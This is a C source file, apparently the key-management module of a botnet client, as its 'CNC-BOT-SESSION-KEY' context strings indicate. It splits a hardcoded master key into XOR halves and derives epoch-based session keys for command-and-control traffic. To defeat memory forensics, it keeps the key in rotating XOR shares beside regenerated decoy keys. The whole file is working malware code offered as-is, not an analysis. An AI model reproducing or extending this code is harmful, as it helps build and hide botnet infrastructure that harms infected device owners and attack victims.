#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>

#include "headers/keyguard.h"
#include "headers/rand.h"
#include "headers/table.h"
#include "headers/hkdf.h"

#ifdef DEBUG
#include <stdio.h>
#define DEBUG_PRINT(fmt, ...) printf("[DEBUG][keyguard] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)
#endif

static const uint8_t MASTER_PART_A[16] = {
    0xC3, 0xFB, 0x88, 0x11, 0xAE, 0xEB, 0x78, 0xF4, 0x4B, 0x51, 0xE1, 0x9A, 0x0A, 0xE3, 0x2B, 0xEC
};

static const uint8_t MASTER_PART_B[16] = {
    0x4F, 0x81, 0xAF, 0xF1, 0x0C, 0xB7, 0x1A, 0xDF, 0x0F, 0xED, 0x68, 0x2B, 0xF8, 0x8B, 0x14, 0x49
};

typedef struct {
    uint8_t shares[KEYGUARD_NUM_SHARES][KEYGUARD_KEY_LEN];
    uint32_t current_epoch;
    time_t last_reobfuscation;
    int initialized;
} keyguard_state_t;

static uint8_t decoy_keys[KEYGUARD_NUM_DECOYS][KEYGUARD_KEY_LEN];

static keyguard_state_t state = {0};
static pthread_mutex_t keyguard_mutex = PTHREAD_MUTEX_INITIALIZER;

static void derive_master_key(uint8_t *master_out) {
    for (int i = 0; i < KEYGUARD_KEY_LEN; i++) {
        master_out[i] = MASTER_PART_A[i] ^ MASTER_PART_B[i];
    }
}

static const char *SESSION_CONTEXT = "CNC-BOT-SESSION-KEY-V2";
static const char *RATCHET_INIT_CONTEXT = "CNC-BOT-RATCHET-INIT-V1";

static void make_epoch_info(uint8_t *info, size_t *info_len, const char *context, uint32_t epoch) {
    size_t ctx_len = strlen(context);
    if (ctx_len > 56) ctx_len = 56;
    memcpy(info, context, ctx_len);
    info[ctx_len + 0] = (epoch >> 24) & 0xFF;
    info[ctx_len + 1] = (epoch >> 16) & 0xFF;
    info[ctx_len + 2] = (epoch >> 8) & 0xFF;
    info[ctx_len + 3] = epoch & 0xFF;
    *info_len = ctx_len + 4;
}

static void derive_ratchet_init(const uint8_t *master, uint32_t epoch, uint8_t *ratchet_out) {
    uint8_t salt[4];
    salt[0] = (epoch >> 24) & 0xFF;
    salt[1] = (epoch >> 16) & 0xFF;
    salt[2] = (epoch >> 8) & 0xFF;
    salt[3] = epoch & 0xFF;

    uint8_t info[64];
    size_t info_len;
    make_epoch_info(info, &info_len, RATCHET_INIT_CONTEXT, epoch);

    hkdf_sha256(salt, sizeof(salt), master, KEYGUARD_KEY_LEN, info, info_len, ratchet_out, KEYGUARD_KEY_LEN);
    secure_memzero(info, sizeof(info));
}

static void derive_session_key(const uint8_t *ratchet_st, uint32_t epoch, uint8_t *session_out) {
    uint8_t salt[4];
    salt[0] = (epoch >> 24) & 0xFF;
    salt[1] = (epoch >> 16) & 0xFF;
    salt[2] = (epoch >> 8) & 0xFF;
    salt[3] = epoch & 0xFF;

    uint8_t info[64];
    size_t info_len;
    make_epoch_info(info, &info_len, SESSION_CONTEXT, epoch);

    hkdf_sha256(salt, sizeof(salt), ratchet_st, KEYGUARD_KEY_LEN, info, info_len, session_out, KEYGUARD_KEY_LEN);
    secure_memzero(info, sizeof(info));
}

static void store_key_3split(const uint8_t *key) {
    int i;
    for (i = 0; i < KEYGUARD_KEY_LEN; i += 4) {
        uint32_t r1 = rand_next();
        uint32_t r2 = rand_next();
        state.shares[0][i]   = (r1 >> 24) & 0xFF;
        state.shares[0][i+1] = (r1 >> 16) & 0xFF;
        state.shares[0][i+2] = (r1 >> 8)  & 0xFF;
        state.shares[0][i+3] =  r1        & 0xFF;
        state.shares[1][i]   = (r2 >> 24) & 0xFF;
        state.shares[1][i+1] = (r2 >> 16) & 0xFF;
        state.shares[1][i+2] = (r2 >> 8)  & 0xFF;
        state.shares[1][i+3] =  r2        & 0xFF;
    }
    for (i = 0; i < KEYGUARD_KEY_LEN; i++) {
        state.shares[2][i] = key[i] ^ state.shares[0][i] ^ state.shares[1][i];
    }
}

static void reconstruct_key(uint8_t *key_out) {
    for (int i = 0; i < KEYGUARD_KEY_LEN; i++) {
        key_out[i] = state.shares[0][i] ^ state.shares[1][i] ^ state.shares[2][i];
    }
}

static void generate_decoys(void) {
    for (int d = 0; d < KEYGUARD_NUM_DECOYS; d++) {
        for (int i = 0; i < KEYGUARD_KEY_LEN; i += 4) {
            uint32_t r = rand_next();
            decoy_keys[d][i]   = (r >> 24) & 0xFF;
            decoy_keys[d][i+1] = (r >> 16) & 0xFF;
            decoy_keys[d][i+2] = (r >> 8)  & 0xFF;
            decoy_keys[d][i+3] =  r        & 0xFF;
        }
    }
}

static void keyguard_reobfuscate_unlocked(void);

uint32_t keyguard_current_epoch(void) {
    return (uint32_t)(time(NULL) / KEYGUARD_EPOCH_SECS);
}

void keyguard_init(void) {
    pthread_mutex_lock(&keyguard_mutex);
    if (state.initialized) {
        pthread_mutex_unlock(&keyguard_mutex);
        return;
    }

    DEBUG_PRINT("Initializing keyguard");

    if (mlock(&state, sizeof(state)) != 0) {
        DEBUG_PRINT("Warning: mlock failed (not root?)");
    }

    generate_decoys();

    uint8_t master[KEYGUARD_KEY_LEN];
    uint8_t session[KEYGUARD_KEY_LEN];

    derive_master_key(master);

    state.current_epoch = keyguard_current_epoch();

    uint8_t ratchet_state[KEYGUARD_KEY_LEN];

    derive_ratchet_init(master, state.current_epoch, ratchet_state);
    secure_memzero(master, sizeof(master));

    derive_session_key(ratchet_state, state.current_epoch, session);

    DEBUG_PRINT("Initial epoch: %u", state.current_epoch);

    store_key_3split(session);

    secure_memzero(session, sizeof(session));
    secure_memzero(ratchet_state, KEYGUARD_KEY_LEN);

    state.last_reobfuscation = time(NULL);
    state.initialized = 1;

    DEBUG_PRINT("Keyguard initialized with ratchet + 3-split");
    pthread_mutex_unlock(&keyguard_mutex);
}

#define REOBFUSCATION_INTERVAL_SEC 30

uint32_t keyguard_get_key(uint8_t *key_out) {
    if (!state.initialized) {
        keyguard_init();
    }
    pthread_mutex_lock(&keyguard_mutex);

    uint32_t current = keyguard_current_epoch();

    if (current != state.current_epoch) {
        DEBUG_PRINT("Epoch changed: %u -> %u, ratcheting key", state.current_epoch, current);

        uint8_t master[KEYGUARD_KEY_LEN];
        uint8_t ratchet_state[KEYGUARD_KEY_LEN];
        uint8_t session[KEYGUARD_KEY_LEN];

        derive_master_key(master);
        derive_ratchet_init(master, current, ratchet_state);
        secure_memzero(master, sizeof(master));

        derive_session_key(ratchet_state, current, session);
        store_key_3split(session);
        secure_memzero(session, sizeof(session));
        secure_memzero(ratchet_state, sizeof(ratchet_state));

        state.current_epoch = current;
        generate_decoys();
    }

    time_t now = time(NULL);
    if (now - state.last_reobfuscation >= REOBFUSCATION_INTERVAL_SEC) {
        keyguard_reobfuscate_unlocked();
    }

    reconstruct_key(key_out);
    pthread_mutex_unlock(&keyguard_mutex);
    return current;
}

void keyguard_get_key_for_epoch(uint8_t *key_out, uint32_t epoch) {
    if (!state.initialized) {
        keyguard_init();
    }
    pthread_mutex_lock(&keyguard_mutex);

    if (epoch == state.current_epoch) {
        reconstruct_key(key_out);
        pthread_mutex_unlock(&keyguard_mutex);
        return;
    }

    uint8_t master[KEYGUARD_KEY_LEN];
    derive_master_key(master);
    uint8_t ratchet_st[KEYGUARD_KEY_LEN];
    derive_ratchet_init(master, epoch, ratchet_st);
    secure_memzero(master, sizeof(master));
    derive_session_key(ratchet_st, epoch, key_out);
    secure_memzero(ratchet_st, sizeof(ratchet_st));
    pthread_mutex_unlock(&keyguard_mutex);

    DEBUG_PRINT("Derived key for distant epoch %u (fallback path)", epoch);
}

static void keyguard_reobfuscate_unlocked(void) {
    if (!state.initialized) return;

    uint8_t key[KEYGUARD_KEY_LEN];
    reconstruct_key(key);

    store_key_3split(key);

    generate_decoys();

    secure_memzero(key, sizeof(key));
    state.last_reobfuscation = time(NULL);

    DEBUG_PRINT("Re-obfuscated key storage (3-split)");
}

void keyguard_reobfuscate(void) {
    pthread_mutex_lock(&keyguard_mutex);
    keyguard_reobfuscate_unlocked();
    pthread_mutex_unlock(&keyguard_mutex);
}

void keyguard_cleanup(void) {
    pthread_mutex_lock(&keyguard_mutex);
    if (!state.initialized) {
        pthread_mutex_unlock(&keyguard_mutex);
        return;
    }

    DEBUG_PRINT("Cleaning up keyguard");

    for (int s = 0; s < KEYGUARD_NUM_SHARES; s++) {
        secure_memzero(state.shares[s], KEYGUARD_KEY_LEN);
    }
    secure_memzero(decoy_keys, sizeof(decoy_keys));

    munlock(&state, sizeof(state));

    state.initialized = 0;
    pthread_mutex_unlock(&keyguard_mutex);
}
